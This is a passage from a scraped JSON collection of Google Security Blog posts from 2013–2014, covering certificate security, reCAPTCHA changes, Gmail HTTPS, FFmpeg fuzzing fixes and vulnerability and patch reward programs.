to users.  That’s why we’ve started a research project to try to pare down existing security advice to a small set of things we can realistically expect our users to do to stay safe online. As part of this project, we are currently running a survey of security experts to see what advice they think is most important.  If you work in security, we’d really appreciate your input.   Please take our survey here: goo.gl/F4fJ59.    With your input we can draw on our collective expertise to get closer to an optimal set of advice that users can realistically follow, and thus, be safer online. Thanks!     ", "date": "March 26, 2014"},
{"website": "Google-Security", "title": "\nKeeping YouTube Views Authentic\n", "author": ["Posted by Philipp Pfeiffenberger, Software Engineer"], "link": "https://security.googleblog.com/2014/02/keeping-youtube-views-authentic.html", "abstract": "                             Posted by Philipp Pfeiffenberger, Software Engineer &nbsp;    YouTube isn&#8217;t just a place for videos, it&#8217;s a place for meaningful human interaction. Whether it&#8217;s views, likes, or comments, these interactions both represent and inform how creators connect with their audience. That&#8217;s why we take the accuracy of these interactions very seriously. When some bad actors try to game the system by artificially inflating view counts, they&#8217;re not just misleading fans about the popularity of a video, they&#8217;re undermining one of YouTube&#8217;s most important and unique qualities.    As part of our long-standing effort to keep YouTube authentic and full of meaningful interactions, we&#8217;ve begun periodically auditing the views a video has received. While in the past we would scan views for spam immediately after they occurred, starting today we will periodically validate the video&#8217;s view count, removing fraudulent views as new evidence comes to light. We don&#8217;t expect this approach to affect more than a minuscule fraction of videos on YouTube, but we believe it&#8217;s crucial to improving the accuracy of view counts and maintaining the trust of our fans and creators.    As YouTube creators, we ask you to be extra careful when working with third-party marketing firms; unfortunately some of them will sell you fake views. If you need help promoting your video, please review our posts about  working with third party view service providers  and  increasing YouTube views .                                     Posted by Philipp Pfeiffenberger, Software Engineer   YouTube isn’t just a place for videos, it’s a place for meaningful human interaction. Whether it’s views, likes, or comments, these interactions both represent and inform how creators connect with their audience. That’s why we take the accuracy of these interactions very seriously. When some bad actors try to game the system by artificially inflating view counts, they’re not just misleading fans about the popularity of a video, they’re undermining one of YouTube’s most important and unique qualities.  As part of our long-standing effort to keep YouTube authentic and full of meaningful interactions, we’ve begun periodically auditing the views a video has received. While in the past we would scan views for spam immediately after they occurred, starting today we will periodically validate the video’s view count, removing fraudulent views as new evidence comes to light. We don’t expect this approach to affect more than a minuscule fraction of videos on YouTube, but we believe it’s crucial to improving the accuracy of view counts and maintaining the trust of our fans and creators.  As YouTube creators, we ask you to be extra careful when working with third-party marketing firms; unfortunately some of them will sell you fake views. If you need help promoting your video, please review our posts about working with third party view service providers and increasing YouTube views.      ", "date": "February 4, 2014"},
{"website": "Google-Security", "title": "\nFurther improving digital certificate security \n", "author": ["Posted by Adam Langley, Security Engineer"], "link": "https://security.googleblog.com/2013/12/further-improving-digital-certificate.html", "abstract": "                             Posted by Adam Langley, Security Engineer     Late on December 3rd, we became aware of unauthorized digital certificates for several Google domains. We investigated immediately and found the certificate was issued by an  intermediate certificate authority  (CA) linking back to ANSSI, a French certificate authority. Intermediate CA certificates carry the full authority of the CA, so anyone who has one can use it to create a certificate for any website they wish to impersonate.    In response, we updated Chrome&#8217;s certificate revocation metadata immediately to block that intermediate CA, and then alerted ANSSI and other browser vendors. Our actions addressed the immediate problem for our users.    ANSSI has found that the intermediate CA certificate was used in a commercial device, on a private network, to inspect encrypted traffic with the knowledge of the users on that network. This was a violation of their procedures and they have asked for the certificate in question to be revoked by browsers. We updated Chrome&#8217;s revocation metadata again to implement this.    This incident represents a serious breach and demonstrates why  Certificate Transparency , which we developed in 2011 and have been advocating for since, is so critical.    Since our priority is the security and privacy of our users, we are carefully considering what additional actions may be necessary.     [Update   December 12: We have decided that the ANSSI certificate authority will be limited to the following top-level domains in a future version of Chrome:&nbsp;    .fr&nbsp;    .gp (Guadeloupe)&nbsp;    .gf (Guyane)&nbsp;    .mq (Martinique)&nbsp;    .re (Réunion)&nbsp;    .yt (Mayotte)&nbsp;    .pm (Saint-Pierre et Miquelon)&nbsp;    .bl (Saint Barthélemy)&nbsp;    .mf (Saint Martin)&nbsp;    .wf (Wallis et Futuna)&nbsp;    .pf (Polynésie française)&nbsp;    .nc (Nouvelle Calédonie)&nbsp;    .tf (Terres australes et antarctiques françaises)]                                    Posted by Adam Langley, Security Engineer  Late on December 3rd, we became aware of unauthorized digital certificates for several Google domains. We investigated immediately and found the certificate was issued by an intermediate certificate authority (CA) linking back to ANSSI, a French certificate authority. Intermediate CA certificates carry the full authority of the CA, so anyone who has one can use it to create a certificate for any website they wish to impersonate.  In response, we updated Chrome’s certificate revocation metadata immediately to block that intermediate CA, and then alerted ANSSI and other browser vendors. Our actions addressed the immediate problem for our users.  ANSSI has found that the intermediate CA certificate was used in a commercial device, on a private network, to inspect encrypted traffic with the knowledge of the users on that network. This was a violation of their procedures and they have asked for the certificate in question to be revoked by browsers. We updated Chrome’s revocation metadata again to implement this.  This incident represents a serious breach and demonstrates why Certificate Transparency, which we developed in 2011 and have been advocating for since, is so critical.  Since our priority is the security and privacy of our users, we are carefully considering what additional actions may be necessary.  [Update December 12: We have decided that the ANSSI certificate authority will be limited to the following top-level domains in a future version of Chrome:  .fr  .gp (Guadeloupe)  .gf (Guyane)  .mq (Martinique)  .re (Réunion)  .yt (Mayotte)  .pm (Saint-Pierre et Miquelon)  .bl (Saint Barthélemy)  .mf (Saint Martin)  .wf (Wallis et Futuna)  .pf (Polynésie française)  .nc (Nouvelle Calédonie)  .tf (Terres australes et antarctiques françaises)]     ", "date": "December 7, 2013"},
{"website": "Google-Security", "title": "\nOut with the old: Stronger certificates with Google Internet Authority G2\n", "author": ["Posted by Dan Dulay, Security Engineer"], "link": "https://security.googleblog.com/2013/11/out-with-old-stronger-certificates-with.html", "abstract": "                             Posted by Dan Dulay, Security Engineer     We take the security and privacy of our users very seriously and, as we  noted  in May, Google has been working to upgrade all its SSL certificates to 2048-bit RSA or better by the end of 2013. Coming in ahead of schedule, we have completed this process, which will allow the industry to start removing trust from weaker, 1024-bit keys next year.    Thanks to our use of  forward secrecy , the confidentiality of SSL connections to Google services from modern browsers was never dependent on our 1024-bit RSA keys. But the deprecation of 1024-bit RSA is an industry-wide effort that we&#8217;re happy to support, particularly light of concerns about overbroad government surveillance and other forms of unwanted intrusion.    The hardware security module (HSM) that contained our old, 1024-bit, intermediate certificate has served us well. Its final duty after all outstanding certificates were revoked, was to be carefully destroyed.    With the demolition of the HSM and revocation of the old certificates,  Google Internet Authority G2  will issue 2048-bit certificates for Google web sites and properties going forward.                                   Posted by Dan Dulay, Security Engineer  We take the security and privacy of our users very seriously and, as we noted in May, Google has been working to upgrade all its SSL certificates to 2048-bit RSA or better by the end of 2013. Coming in ahead of schedule, we have completed this process, which will allow the industry to start removing trust from weaker, 1024-bit keys next year.  Thanks to our use of forward secrecy, the confidentiality of SSL connections to Google services from modern browsers was never dependent on our 1024-bit RSA keys. But the deprecation of 1024-bit RSA is an industry-wide effort that we’re happy to support, particularly light of concerns about overbroad government surveillance and other forms of unwanted intrusion.  The hardware security module (HSM) that contained our old, 1024-bit, intermediate certificate has served us well. Its final duty after all outstanding certificates were revoked, was to be carefully destroyed.  With the demolition of the HSM and revocation of the old certificates, Google Internet Authority G2 will issue 2048-bit certificates for Google web sites and properties going forward.     ", "date": "November 18, 2013"},
{"website": "Google-Security", "title": "\nEven more patch rewards!\n", "author": ["Posted by Michal Zalewski, Google Security Team"], "link": "https://security.googleblog.com/2013/11/even-more-patch-rewards.html", "abstract": "                             Posted by Michal Zalewski, Google Security Team    About a month ago, we kicked off our  Patch Reward Program . The goal is very simple: to recognize and reward proactive security improvements to third-party open-source projects that are vital to the health of the entire Internet.    We started with a fairly conservative scope, but said we would expand the program soon. Today, we are adding the following to the list of projects that are eligible for rewards:       All the open-source components of Android: Android Open Source Project   Widely used web servers: Apache httpd, lighttpd, nginx   Popular mail delivery services: Sendmail, Postfix, Exim, Dovecot   Virtual private networking: OpenVPN   Network time: University of Delaware NTPD   Additional core libraries: Mozilla NSS, libxml2   Toolchain security improvements for GCC, binutils, and llvm     For more information about eligibility, reward amounts, and the submission process, please visit  this page . Happy patching!                                       Posted by Michal Zalewski, Google Security Team  About a month ago, we kicked off our Patch Reward Program. The goal is very simple: to recognize and reward proactive security improvements to third-party open-source projects that are vital to the health of the entire Internet.  We started with a fairly conservative scope, but said we would expand the program soon. Today, we are adding the following to the list of projects that are eligible for rewards:    All the open-source components of Android: Android Open Source Project  Widely used web servers: Apache httpd, lighttpd, nginx  Popular mail delivery services: Sendmail, Postfix, Exim, Dovecot  Virtual private networking: OpenVPN  Network time: University of Delaware NTPD  Additional core libraries: Mozilla NSS, libxml2  Toolchain security improvements for GCC, binutils, and llvm   For more information about eligibility, reward amounts, and the submission process, please visit this page. Happy patching!       ", "date": "November 18, 2013"},
{"website": "Google-Security", "title": "\nCAPTCHAs that capture your heart\n", "author": ["Posted by Vinay Shet, Product Manager, reCAPTCHA"], "link": "https://security.googleblog.com/2014/02/captchas-that-capture-your-heart.html", "abstract": "                             Posted by Vinay Shet, Product Manager, reCAPTCHA     Notice something different about  reCAPTCHA  today? You guessed it; those tricky puzzles are now warm and fuzzy just in time for Valentine&#8217;s Day. Today across the U.S., we're sharing CAPTCHAs that spread the message of love.                 Some examples of Valentine's Day CAPTCHAs         But wait. These look really easy. Does this mean that those pesky bots are going to crack these easy CAPTCHAs and abuse our favorite websites? Not so fast.    A few months ago,  we announced  an improved version of reCAPTCHA that uses advanced risk analysis techniques to distinguish humans from machines. This enabled us to relax the text distortions and show our users CAPTCHAs that adapt to their risk profiles. In other words, with a high likelihood, our valid human users would see CAPTCHAs that they would find easy to solve. Abusive traffic, on the other hand, would get CAPTCHAs designed to stop them in their tracks. It is this same technology that enables us to show these Valentine&#8217;s Day CAPTCHAs today without reducing their anti-abuse effectiveness.    But that&#8217;s not all. Over the last few months, we&#8217;ve been working hard to improve the audio CAPTCHA experience. Our adaptive CAPTCHA technology has, in many cases, allowed us to relax audio distortions and serve significantly easier audio CAPTCHAs. We&#8217;ve served over 10 million easy audio CAPTCHAs to users worldwide over the last few weeks and have seen great success rates. We hope to continue enhancing our accessibility option in reCAPTCHA in the months to come. Take a listen to this sample of easy audio CAPTCHA:      &nbsp;          Your browser does not support this audio  &nbsp;    We&#8217;re working hard to improve people&#8217;s experience with reCAPTCHA without compromising on the spam and abuse protection you&#8217;ve come to trust from us. For today, we hope you enjoy our Valentine&#8217;s Day gift to you.                                   Posted by Vinay Shet, Product Manager, reCAPTCHA  Notice something different about reCAPTCHA today? You guessed it; those tricky puzzles are now warm and fuzzy just in time for Valentine’s Day. Today across the U.S., we're sharing CAPTCHAs that spread the message of love.    Some examples of Valentine's Day CAPTCHAs   But wait. These look really easy. Does this mean that those pesky bots are going to crack these easy CAPTCHAs and abuse our favorite websites? Not so fast.  A few months ago, we announced an improved version of reCAPTCHA that uses advanced risk analysis techniques to distinguish humans from machines. This enabled us to relax the text distortions and show our users CAPTCHAs that adapt to their risk profiles. In other words, with a high likelihood, our valid human users would see CAPTCHAs that they would find easy to solve. Abusive traffic, on the other hand, would get CAPTCHAs designed to stop them in their tracks. It is this same technology that enables us to show these Valentine’s Day CAPTCHAs today without reducing their anti-abuse effectiveness.  But that’s not all. Over the last few months, we’ve been working hard to improve the audio CAPTCHA experience. Our adaptive CAPTCHA technology has, in many cases, allowed us to relax audio distortions and serve significantly easier audio CAPTCHAs. We’ve served over 10 million easy audio CAPTCHAs to users worldwide over the last few weeks and have seen great success rates. We hope to continue enhancing our accessibility option in reCAPTCHA in the months to come. Take a listen to this sample of easy audio CAPTCHA:         Your browser does not support this audio    We’re working hard to improve people’s experience with reCAPTCHA without compromising on the spam and abuse protection you’ve come to trust from us. For today, we hope you enjoy our Valentine’s Day gift to you.     ", "date": "February 14, 2014"},
{"website": "Google-Security", "title": "\nStaying at the forefront of email security and reliability: HTTPS-only and 99.978 percent availability\n", "author": ["Posted by Nicolas Lidzborski, Gmail Security Engineering Lead"], "link": "https://security.googleblog.com/2014/03/staying-at-forefront-of-email-security.html", "abstract": "                             Posted by Nicolas Lidzborski, Gmail Security Engineering Lead        Cross-posted on the  Official Google Blog  and  Gmail Blog      Your email is important to you, and making sure it stays safe and always available is important to us. As you go about your day reading, writing, and checking messages, there are tons of security measures running behind the scenes to keep your email safe, secure, and there whenever you need it.    Starting today, Gmail will always use an encrypted HTTPS connection when you check or send email. Gmail  has supported HTTPS  since the day it launched, and in 2010 we made  HTTPS the default . Today's change means that no one can listen in on your messages as they go back and forth between you and Gmail&#8217;s servers&#8212;no matter if you're using public WiFi or logging in from your computer, phone or tablet.    In addition, every single email message you send or receive&#8212;100 percent of them&#8212;is encrypted while moving internally. This ensures that your messages are safe not only when they move between you and Gmail's servers, but also as they move between Google's data centers&#8212;something we made a top priority after last summer&#8217;s revelations.    Of course, being able to access your email is just as important as keeping it safe and secure. In 2013, Gmail was available 99.978 percent of the time, which averages to less than two hours of disruption for a user for the entire year. Our engineering experts look after Google's services 24x7 and if a problem ever arises, they're on the case immediately. We keep you informed by posting updates on the  Apps Status Dashboard  until the issue is fixed, and we always conduct a full analysis on the problem to prevent it from happening again.    Our commitment to the security and reliability of your email is absolute, and we&#8217;re constantly working on ways to improve. You can learn about additional ways to keep yourself safe online, like  creating strong passwords  and  enabling 2-step verification , by visiting the Security Center:  https://www.google.com/help/security .                                    Posted by Nicolas Lidzborski, Gmail Security Engineering Lead  Cross-posted on the Official Google Blog and Gmail Blog  Your email is important to you, and making sure it stays safe and always available is important to us. As you go about your day reading, writing, and checking messages, there are tons of security measures running behind the scenes to keep your email safe, secure, and there whenever you need it.  Starting today, Gmail will always use an encrypted HTTPS connection when you check or send email. Gmail has supported HTTPS since the day it launched, and in 2010 we made HTTPS the default. Today's change means that no one can listen in on your messages as they go back and forth between you and Gmail’s servers—no matter if you're using public WiFi or logging in from your computer, phone or tablet.  In addition, every single email message you send or receive—100 percent of them—is encrypted while moving internally. This ensures that your messages are safe not only when they move between you and Gmail's servers, but also as they move between Google's data centers—something we made a top priority after last summer’s revelations.  Of course, being able to access your email is just as important as keeping it safe and secure. In 2013, Gmail was available 99.978 percent of the time, which averages to less than two hours of disruption for a user for the entire year. Our engineering experts look after Google's services 24x7 and if a problem ever arises, they're on the case immediately. We keep you informed by posting updates on the Apps Status Dashboard until the issue is fixed, and we always conduct a full analysis on the problem to prevent it from happening again.  Our commitment to the security and reliability of your email is absolute, and we’re constantly working on ways to improve. You can learn about additional ways to keep yourself safe online, like creating strong passwords and enabling 2-step verification, by visiting the Security Center: https://www.google.com/help/security.     ", "date": "March 20, 2014"},
{"website": "Google-Security", "title": "\nTransparency Report: Making the web a safer place\n", "author": ["Posted by Lucas Ballard, Software Engineer"], "link": "https://security.googleblog.com/2013/06/transparency-report-making-web-safer.html", "abstract": "                             Posted by Lucas Ballard, Software Engineer      [Cross-posted from the  Official Google Blog ]     Two of the biggest threats online are malicious software (known as malware) that can take control of your computer, and phishing scams that try to trick you into sharing passwords or other private information.    So in 2006 we started a  Safe Browsing program  to find and flag suspect websites. This means that when you are surfing the web, we can now warn you when a site is unsafe. We're currently flagging up to 10,000 sites a day&#8212;and because we share this technology with other browsers there are about 1 billion users we can help keep safe.    But we're always looking for new ways to protect users' security. So today we're launching a new section on our  Transparency Report  that will shed more light on the sources of malware and phishing attacks.  You can now learn how many people see Safe Browsing warnings each week, where malicious sites are hosted around the world, how quickly websites become reinfected after their owners clean malware from their sites, and other tidbits we&#8217;ve surfaced.             Sharing this information also aligns well with our Transparency Report, which already gives information about government requests for user data, government requests to remove content, and current disruptions to our services.    To learn more, explore the new Safe Browsing information on  this page . Webmasters and network administrators can find recommendations for dealing with malware infections, including resources like  Google Webmaster Tools  and  Safe Browsing Alerts for Network Administrators .                                   Posted by Lucas Ballard, Software Engineer  [Cross-posted from the Official Google Blog]  Two of the biggest threats online are malicious software (known as malware) that can take control of your computer, and phishing scams that try to trick you into sharing passwords or other private information.  So in 2006 we started a Safe Browsing program to find and flag suspect websites. This means that when you are surfing the web, we can now warn you when a site is unsafe. We're currently flagging up to 10,000 sites a day—and because we share this technology with other browsers there are about 1 billion users we can help keep safe.  But we're always looking for new ways to protect users' security. So today we're launching a new section on our Transparency Report that will shed more light on the sources of malware and phishing attacks.  You can now learn how many people see Safe Browsing warnings each week, where malicious sites are hosted around the world, how quickly websites become reinfected after their owners clean malware from their sites, and other tidbits we’ve surfaced.     Sharing this information also aligns well with our Transparency Report, which already gives information about government requests for user data, government requests to remove content, and current disruptions to our services.  To learn more, explore the new Safe Browsing information on this page. Webmasters and network administrators can find recommendations for dealing with malware infections, including resources like Google Webmaster Tools and Safe Browsing Alerts for Network Administrators.     ", "date": "June 25, 2013"},
{"website": "Google-Security", "title": "\nFFmpeg and a thousand fixes\n", "author": ["Posted by Mateusz Jurczyk and Gynvael Coldwind, Information Security Engineers"], "link": "https://security.googleblog.com/2014/01/ffmpeg-and-thousand-fixes.html", "abstract": "                             Posted by Mateusz Jurczyk and Gynvael Coldwind, Information Security Engineers     At Google, security is a top priority - not only for our own products, but across the entire Internet. That&#8217;s why members of the Google Security Team and other Googlers frequently perform audits of software and report the resulting findings to the respective vendors or maintainers, as shown in the official &#8220; Vulnerabilities - Application Security &#8221; list. We also try to employ the extensive computing power of our data centers in order to solve some of the security challenges by performing large-scale automated testing, commonly known as fuzzing.    One internal fuzzing effort we have been running continuously for the past two years is the testing process of&nbsp; FFmpeg , a large cross-platform solution to record, convert and stream audio and video written in C. It&nbsp;is used in multiple applications and software libraries such as Google Chrome, MPlayer, VLC or xine. We started relatively small by making use of trivial mutation algorithms, some 500 cores and input media samples gathered from readily available sources such as the  samples.mplayerhq.hu  sample base and FFmpeg FATE regression testing suite. Later on, we grew to more complex and effective mutation methods, 2000 cores and an input corpus supported by sample files improving the overall code coverage.    Following more than two years of work, we are happy to announce that the FFmpeg project has incorporated more than a thousand fixes to bugs (including some security issues) that we have discovered in the project so far:     $ git log | grep Jurczyk | grep -c Coldwind    1120     This event clearly marks an important milestone in our ongoing fuzzing effort.    FFmpeg robustness and security has clearly improved over time. When we started the fuzzing process and had initial results, we contacted the project maintainer - Michael Niedermayer - who submitted the first fix on the 24th of January, 2012 (see commit  c77be3a35a0160d6af88056b0899f120f2eef38e ). Since then, we have carried out several dozen fuzzing iterations (each typically resulting in less crashes than the previous ones) over the last two years, identifying bugs of a number of different classes:     NULL pointer dereferences,&nbsp;   Invalid pointer arithmetic leading to SIGSEGV due to unmapped memory access,&nbsp;   Out-of-bounds reads and writes to stack, heap and static-based arrays,&nbsp;   Invalid free() calls,&nbsp;   Double free() calls over the same pointer,&nbsp;   Division errors,&nbsp;   Assertion failures,&nbsp;   Use of uninitialized memory.&nbsp;    We have simultaneously worked with the developers of Libav, an independent fork of FFmpeg, in order to have both projects represent an equal, high level of robustness and security posture. Today, Libav is at 413 fixes and the library is slowly but surely catching up with FFmpeg.    We are continuously improving our corpus and fuzzing methods and will continue to work with both FFmpeg and Libav to ensure the highest quality of the software as used by millions of users behind multiple media players. Until we can declare both projects \"fuzz clean\" we recommend that people refrain from using either of the two projects to process untrusted media files. You can also use privilege separation on your PC or production environment when absolutely required.    Of course, we would not be able to do this without the hard work of all the developers involved in the fixing process. If you are interested in the effort, please keep an eye on the master branches for commits marked as  \"Found by Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\"  and watch out for new stable versions of the software packages.    For more details, see the &#8220;FFmpeg and a thousand fixes&#8221; posts at the authors&#8217; personal blogs  here  or  here .                                   Posted by Mateusz Jurczyk and Gynvael Coldwind, Information Security Engineers  At Google, security is a top priority - not only for our own products, but across the entire Internet. That’s why members of the Google Security Team and other Googlers frequently perform audits of software and report the resulting findings to the respective vendors or maintainers, as shown in the official “Vulnerabilities - Application Security” list. We also try to employ the extensive computing power of our data centers in order to solve some of the security challenges by performing large-scale automated testing, commonly known as fuzzing.  One internal fuzzing effort we have been running continuously for the past two years is the testing process of FFmpeg, a large cross-platform solution to record, convert and stream audio and video written in C. It is used in multiple applications and software libraries such as Google Chrome, MPlayer, VLC or xine. We started relatively small by making use of trivial mutation algorithms, some 500 cores and input media samples gathered from readily available sources such as the samples.mplayerhq.hu sample base and FFmpeg FATE regression testing suite. Later on, we grew to more complex and effective mutation methods, 2000 cores and an input corpus supported by sample files improving the overall code coverage.  Following more than two years of work, we are happy to announce that the FFmpeg project has incorporated more than a thousand fixes to bugs (including some security issues) that we have discovered in the project so far:  $ git log | grep Jurczyk | grep -c Coldwind 1120  This event clearly marks an important milestone in our ongoing fuzzing effort.  FFmpeg robustness and security has clearly improved over time. When we started the fuzzing process and had initial results, we contacted the project maintainer - Michael Niedermayer - who submitted the first fix on the 24th of January, 2012 (see commit c77be3a35a0160d6af88056b0899f120f2eef38e). Since then, we have carried out several dozen fuzzing iterations (each typically resulting in less crashes than the previous ones) over the last two years, identifying bugs of a number of different classes:  NULL pointer dereferences,  Invalid pointer arithmetic leading to SIGSEGV due to unmapped memory access,  Out-of-bounds reads and writes to stack, heap and static-based arrays,  Invalid free() calls,  Double free() calls over the same pointer,  Division errors,  Assertion failures,  Use of uninitialized memory.   We have simultaneously worked with the developers of Libav, an independent fork of FFmpeg, in order to have both projects represent an equal, high level of robustness and security posture. Today, Libav is at 413 fixes and the library is slowly but surely catching up with FFmpeg.  We are continuously improving our corpus and fuzzing methods and will continue to work with both FFmpeg and Libav to ensure the highest quality of the software as used by millions of users behind multiple media players. Until we can declare both projects \"fuzz clean\" we recommend that people refrain from using either of the two projects to process untrusted media files. You can also use privilege separation on your PC or production environment when absolutely required.  Of course, we would not be able to do this without the hard work of all the developers involved in the fixing process. If you are interested in the effort, please keep an eye on the master branches for commits marked as \"Found by Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\" and watch out for new stable versions of the software packages.  For more details, see the “FFmpeg and a thousand fixes” posts at the authors’ personal blogs here or here.     ", "date": "January 10, 2014"},
{"website": "Google-Security", "title": "\nreCAPTCHA just got easier (but only if you’re human)\n", "author": ["Posted by Vinay Shet, Product Manager, reCAPTCHA"], "link": "https://security.googleblog.com/2013/10/recaptcha-just-got-easier-but-only-if.html", "abstract": "                             Posted by Vinay Shet, Product Manager, reCAPTCHA       For over a decade,  CAPTCHA s have used visual puzzles to help webmasters keep automated software from engaging in abusive activities on their sites. However, over the last few years advances in artificial intelligence have reduced the gap between human and machine capabilities in deciphering distorted text. Today, a successful CAPTCHA solution needs to go beyond just relying on text distortions to separate man from machine.    The reCAPTCHA team has been performing extensive research and making steady improvements to learn how to better protect users from attackers. As a result, reCAPTCHA is now more adaptive and better-equipped to distinguish legitimate users from automated software.    The updated system uses advanced risk analysis techniques, actively considering the user&#8217;s entire engagement with the CAPTCHA&#8212;before, during and after they interact with it. That means that today the distorted letters serve less as a test of humanity and more as a medium of engagement to elicit a broad range of cues that characterize humans and bots.     As part of this, we&#8217;ve recently released an update that creates different classes of CAPTCHAs for different kinds of users. This multi-faceted approach allows us to determine whether a potential user is actually a human or not, and serve our legitimate users CAPTCHAs that most of them will find easy to solve. Bots, on the other hand, will see CAPTCHAs that are considerably more difficult and designed to stop them from getting through.              A new and easier numeric CAPTCHA      Humans find numeric CAPTCHAs significantly easier to solve than those containing arbitrary text and achieve nearly perfect pass rates on them. So with our new system, you&#8217;ll encounter CAPTCHAs that are a breeze to solve. Bots, however, won&#8217;t even see them. While we&#8217;ve already made significant advancements to reCAPTCHA technology, we&#8217;ll have even more to report on in the next few months, so stay tuned.                                   Posted by Vinay Shet, Product Manager, reCAPTCHA    For over a decade, CAPTCHAs have used visual puzzles to help webmasters keep automated software from engaging in abusive activities on their sites. However, over the last few years advances in artificial intelligence have reduced the gap between human and machine capabilities in deciphering distorted text. Today, a successful CAPTCHA solution needs to go beyond just relying on text distortions to separate man from machine.  The reCAPTCHA team has been performing extensive research and making steady improvements to learn how to better protect users from attackers. As a result, reCAPTCHA is now more adaptive and better-equipped to distinguish legitimate users from automated software.  The updated system uses advanced risk analysis techniques, actively considering the user’s entire engagement with the CAPTCHA—before, during and after they interact with it. That means that today the distorted letters serve less as a test of humanity and more as a medium of engagement to elicit a broad range of cues that characterize humans and bots.   As part of this, we’ve recently released an update that creates different classes of CAPTCHAs for different kinds of users. This multi-faceted approach allows us to determine whether a potential user is actually a human or not, and serve our legitimate users CAPTCHAs that most of them will find easy to solve. Bots, on the other hand, will see CAPTCHAs that are considerably more difficult and designed to stop them from getting through.     A new and easier numeric CAPTCHA   Humans find numeric CAPTCHAs significantly easier to solve than those containing arbitrary text and achieve nearly perfect pass rates on them. So with our new system, you’ll encounter CAPTCHAs that are a breeze to solve. Bots, however, won’t even see them. While we’ve already made significant advancements to reCAPTCHA technology, we’ll have even more to report on in the next few months, so stay tuned.     ", "date": "October 25, 2013"},
{"website": "Google-Security", "title": "\nSecurity rewards at Google: Two MEEELLION Dollars Later\n", "author": ["Posted by Chris Evans and Adam Mein, Masters of Coin"], "link": "https://security.googleblog.com/2013/08/security-rewards-at-google-two.html", "abstract": "                             Posted by Chris Evans and Adam Mein, Masters of Coin     One of Google&#8217;s core security principles is to engage the community, to better protect our users and build relationships with security researchers. We had this principle in mind as we launched our  Chromium  and  Google Web  Vulnerability Reward Programs. We didn&#8217;t know what to expect, but in the three years since launch, we&#8217;ve rewarded (and fixed!) more than 2,000 security bug reports and also received recognition for setting  leading standards for response time .    The collective creativity of the wider security community has surpassed all expectations, and their expertise has helped make Chrome even safer for hundreds of millions of users around the world. Today we&#8217;re delighted to announce we&#8217;ve now paid out in excess of $2,000,000 (USD) across Google&#8217;s security reward initiatives. Broken down, this total includes more than $1,000,000 (USD) for the  Chromium VRP  /  Pwnium  rewards, and in excess of $1,000,000 (USD) for the  Google Web VRP  rewards.    Today, the Chromium program is raising reward levels significantly. In a nutshell, bugs previously rewarded at the $1,000 level will now be considered for reward at up to $5,000. In many cases, this will be a 5x increase in reward level! We&#8217;ll issue higher rewards for bugs we believe present a more significant threat to user safety, and when the researcher provides an accurate analysis of exploitability and severity. We will continue to pay  previously announced bonuses  on top, such as those for  providing a patch  or finding an issue in a critical piece of open source software.    Interested Chromium researchers should familiarize themselves with our documentation on  how to report a security bug well  and  how we determine higher reward eligibility .    These Chromium reward level increases follow on from similar  increases under the Google Web program . With all these new levels, we&#8217;re excited to march towards new milestones and a more secure web.                                              Posted by Chris Evans and Adam Mein, Masters of Coin  One of Google’s core security principles is to engage the community, to better protect our users and build relationships with security researchers. We had this principle in mind as we launched our Chromium and Google Web Vulnerability Reward Programs. We didn’t know what to expect, but in the three years since launch, we’ve rewarded (and fixed!) more than 2,000 security bug reports and also received recognition for setting leading standards for response time.  The collective creativity of the wider security community has surpassed all expectations, and their expertise has helped make Chrome even safer for hundreds of millions of users around the world. Today we’re delighted to announce we’ve now paid out in excess of $2,000,000 (USD) across Google’s security reward initiatives. Broken down, this total includes more than $1,000,000 (USD) for the Chromium VRP / Pwnium rewards, and in excess of $1,000,000 (USD) for the Google Web VRP rewards.  Today, the Chromium program is raising reward levels significantly. In a nutshell, bugs previously rewarded at the $1,000 level will now be considered for reward at up to $5,000. In many cases, this will be a 5x increase in reward level! We’ll issue higher rewards for bugs we believe present a more significant threat to user safety, and when the researcher provides an accurate analysis of exploitability and severity. We will continue to pay previously announced bonuses on top, such as those for providing a patch or finding an issue in a critical piece of open source software.  Interested Chromium researchers should familiarize themselves with our documentation on how to report a security bug well and how we determine higher reward eligibility.  These Chromium reward level increases follow on from similar increases under the Google Web program. With all these new levels, we’re excited to march towards new milestones and a more secure web.          ", "date": "August 12, 2013"},
{"website": "Google-Security", "title": "\nSecurity Reward Programs Update\n", "author": ["Posted by Eduardo Vela Nava and Michal Zalewski, Google Security Team"], "link": "https://security.googleblog.com/2014/02/security-reward-programs-update.html", "abstract": "                             Posted by Eduardo Vela Nava and Michal Zalewski, Google Security Team     From investing our time in doing  security research  to paying for  security bugs  and  patches , we've really enjoyed and benefited from our involvement with the security community over the past few years. To underscore our commitment, we want to announce yet another increase in payments since we started our reward programs.    Starting today, we will broaden the scope of our  vulnerability reward program  to also include all Chrome apps and extensions developed and branded as \" by Google .\" We think developing Chrome extensions securely is relatively easy (given our  security guidelines  are followed), but given that extensions like  Hangouts  and  GMail  are widely used, we want to make sure efforts to keep them secure are rewarded accordingly.    The rewards for each vulnerability will range from the usual  $500  up to  $10,000  USD and will depend on the permissions and the data each extension handles. If you find a vulnerability in any Google-developed Chrome Extensions, please contact us at  goo.gl/vulnz .    In addition, we decided to substantially increase the reward amounts offered by our  Patch Reward Program . The program encourages and honors proactive security improvements made to a range of open-source projects that are critical to the health of the Internet in recognition of the painstaking work that's necessary to make a project resilient to attacks.    Our new reward structure is:      $10,000  for complicated, high-impact improvements that almost certainly prevent major vulnerabilities in the affected code.&nbsp;    $5,000  for moderately complex patches that provide convincing security benefits.   Between  $500  and  $1,337  for submissions that are very simple or that offer only fairly speculative gains.&nbsp;    We look forward to ongoing collaboration with the broader security community, and we'll continue to invest in these programs to help make the Internet a safer place for everyone.                                   Posted by Eduardo Vela Nava and Michal Zalewski, Google Security Team  From investing our time in doing security research to paying for security bugs and patches, we've really enjoyed and benefited from our involvement with the security community over the past few years. To underscore our commitment, we want to announce yet another increase in payments since we started our reward programs.  Starting today, we will broaden the scope of our vulnerability reward program to also include all Chrome apps and extensions developed and branded as \"by Google.\" We think developing Chrome extensions securely is relatively easy (given our security guidelines are followed), but given that extensions like Hangouts and GMail are widely used, we want to make sure efforts to keep them secure are rewarded accordingly.  The rewards for each vulnerability will range from the usual $500 up to $10,000 USD and will depend on the permissions and the data each extension handles. If you find a vulnerability in any Google-developed Chrome Extensions, please contact us at goo.gl/vulnz.  In addition, we decided to substantially increase the reward amounts offered by our Patch Reward Program. The program encourages and honors proactive security improvements made to a range of open-source projects that are critical to the health of the Internet in recognition of the painstaking work that's necessary to make a project resilient to attacks.  Our new reward structure is:  $10,000 